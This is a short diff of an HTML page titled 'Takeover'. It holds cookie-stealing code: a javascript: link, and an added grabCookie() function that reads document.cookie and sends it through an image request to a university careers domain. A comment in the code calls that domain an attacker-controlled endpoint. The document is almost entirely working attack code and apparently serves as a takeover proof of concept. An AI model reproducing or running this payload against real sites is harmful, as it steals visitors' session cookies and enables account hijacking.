@@ -1,3 +1,16 @@
 <h1>Takeover</h1>
 
 <a href="javascript:document.location='https://globalcareers.monash.edu?cookie=' + encodeURIComponent(document.cookie)">Click Here</a>
+
+<a href="#" onclick="grabCookie()">Click me</a>
+
+<script>
+function grabCookie() {
+    // Send the cookie value to an attacker-controlled endpoint
+  alert();
+    var cookieValue = document.cookie;
+    var img = new Image();
+    img.src = 'https://globalcareers.monash.edu?cookie=' + encodeURIComponent(cookieValue);
+    document.body.appendChild(img);
+}
+</script>
